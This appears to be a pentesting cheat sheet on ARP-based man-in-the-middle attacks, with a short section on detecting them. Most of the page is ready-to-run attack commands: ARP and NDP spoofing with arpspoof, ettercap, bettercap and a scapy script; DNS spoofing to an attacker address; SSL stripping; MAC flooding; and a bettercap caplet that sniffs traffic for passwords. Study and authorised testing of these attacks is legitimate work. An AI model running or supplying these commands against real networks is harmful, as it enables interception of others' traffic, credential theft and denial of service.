---
title: "ARP"
---

# ARP

## Resources

- [hacktricks.wiki](https://hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/index.html)
- [Ettercap Documentation](https://www.ettercap-project.org/)

## Prerequisites

ARP Spoofing requires **IP forwarding** to be enabled on the attacker machine so that intercepted traffic is relayed to its real destination. Without it, the attack degrades into a simple DoS.

```bash
# Enable IP Forwarding (Linux)
echo 1 > /proc/sys/net/ipv4/ip_forward
# Permanent
sysctl -w net.ipv4.ip_forward=1
```

## 🔴 Exploit

:::code-group

```bash [arpspoof]
# apt install dsniff
arpspoof -t 192.168.1.2 192.168.1.3
arpspoof -t 192.168.1.3 192.168.1.2
```

```bash [ettercap]
ettercap -T -M arp:remote /192.168.1.2// /192.168.1.3// -i $interface
```

```bash [bettercap]
sudo bettercap -iface eth0 -caplet mitm.cap
```

:::

### DNS Spoofing

Redirects the victim's DNS queries to an attacker-controlled IP. Usually combined with a web server (Apache/Nginx) to serve the fraudulent page.

:::code-group

```bash [bettercap]
# Configuration
set dns.spoof.domains example.com,*.example.com
set dns.spoof.address $ATTACKER_IP
# dns.spoof.all true # Answer ALL DNS queries
dns.spoof on
```

```bash [ettercap]
# 1. Edit /etc/ettercap/etter.dns
# example.com    A    $ATTACKER_IP
# *.example.com  A    $ATTACKER_IP

# 2. Start attack with dns_spoof plugin
ettercap -T -P dns_spoof -M arp:remote /192.168.1.2// /192.168.1.3//
```

:::

### SSL Stripping

Downgrades HTTPS connections to plaintext HTTP. **Does not work against HSTS**.

:::code-group

```bash [bettercap]
# Enable SSL stripping in the HTTP proxy
set http.proxy.sslstrip true
set http.proxy.port 8080
http.proxy on

# Optionally, use a script for more advanced stripping (e.g., Drule)
# set http.proxy.script drule.js
```

```bash [ettercap]
# Requires sslstrip (or sslstrip2) running separately
# 1. iptables redirect port 80 to sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# 2. Start sslstrip
sslstrip -l 10000
# 3. Start ettercap
ettercap -T -M arp:remote /192.168.1.2// /192.168.1.3// -F sslstrip.filter
```

:::

### NDP Spoofing (IPv6)

IPv6 equivalent of ARP Spoofing. Sends forged Neighbor Advertisement packets to poison the Neighbor Cache of targets. Required when the network uses IPv6, since classic ARP Spoofing does not apply.

:::code-group

```bash [bettercap]
# Configuration
set ndp.spoof.targets <IPv6_1>,<IPv6_2>
set ndp.spoof.fullduplex true
set ndp.spoof.forwarding true
ndp.spoof on
```

```bash [scapy]
# Send forged Neighbor Advertisement
from scapy.all import *
target = "2001:db8::42"
spoofed = "2001:db8::1"
mac = get_if_hwaddr("eth0")
pkt = Ether(src=mac, dst="33:33:00:00:00:01") / \
      IPv6(src=spoofed, dst=target) / \
      ICMPv6ND_NA(tgt=spoofed, R=0, S=1, O=1) / \
      ICMPv6NDOptDstLLAddr(lladdr=mac)
sendp(pkt, iface="eth0", loop=1, inter=2)
```

:::

## MAC Flooding / CAM Overflow

Saturates the switch MAC table to force it into "hub mode" (broadcasting all traffic).

```bash
# apt install dsniff
macof -i $interface
```

## 🔵 Detection

::: details

### Wireshark Filters

Detects unsolicited ARP replies and IP-MAC conflicts.

```
arp                             # All ARP traffic
arp.opcode == 2                 # ARP Replies only
arp.isgratuitous                # Gratuitous ARP (common in spoofing)
arp.duplicate-address-detected  # Wireshark's built-in conflict detection
```

**Analysis:** Check `Analyze -> Expert Information` for "Duplicate IP address configured" warnings. The same IP claimed by two different MACs means spoofing.

### CLI Tools

```bash
# arpwatch - Monitors ARP activity and emails on changes
sudo arpwatch -i eth0

# tshark one-liner to detect conflicts
sudo tshark -i eth0 -Y "arp.opcode == 2" -T fields \
  -e arp.src.proto_ipv4 -e arp.src.hw_mac 2>/dev/null | awk '
{
    ip=$1; mac=$2
    if (seen[ip] && seen[ip] != mac) {
        print "ARP SPOOF DETECTED: " ip " claimed by " seen[ip] " AND " mac
    }
    seen[ip]=mac
}'
```

:::

## Bettercap

- [bettercap.org](https://www.bettercap.org/)

```bash [bettercap]
bettercap -iface $interface -caplet config.cap
```

::: details `bettercap config` (mitm.cap)

```ini
# Discovery
net.probe on      # Active discovery
net.recon on      # Passive recon from ARP table
net.show          # Show discovered hosts

# ARP Spoofing
set arp.spoof.targets <IP1>,<IP2>,...  # Set targets
set arp.spoof.fullduplex true          # Attack target & gateway
set arp.spoof.internal true            # Poison local network hosts
set arp.spoof.whitelist <IP>           # Do not poison special IP
set arp.spoof.forwarding true          # Forward packets to real dst
arp.spoof on                           # Start spoofing
# arp.ban on                           # DoS: target connectivity down

# Sniffing
net.sniff on
set net.sniff.output sniffed.pcap      # Output to pcap
set net.sniff.verbose true             # Display packets in terminal
set net.sniff.filter 'not arp'         # BPF filter to skip ARP noise
set net.sniff.regexp '.*password.*'    # Filter content by regexp

# DNS Spoofing
set dns.spoof.domains example.com
set dns.spoof.address $ATTACKER_IP
dns.spoof on

# SSL Stripping
set http.proxy.sslstrip true
http.proxy on
```

:::

## References

- [HackTricks - Pentesting Network](https://hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/index.html)
- [Wireshark ARP Filters](https://www.wireshark.org/docs/dfref/a/arp.html)
- [Bettercap arp.spoof](https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/)
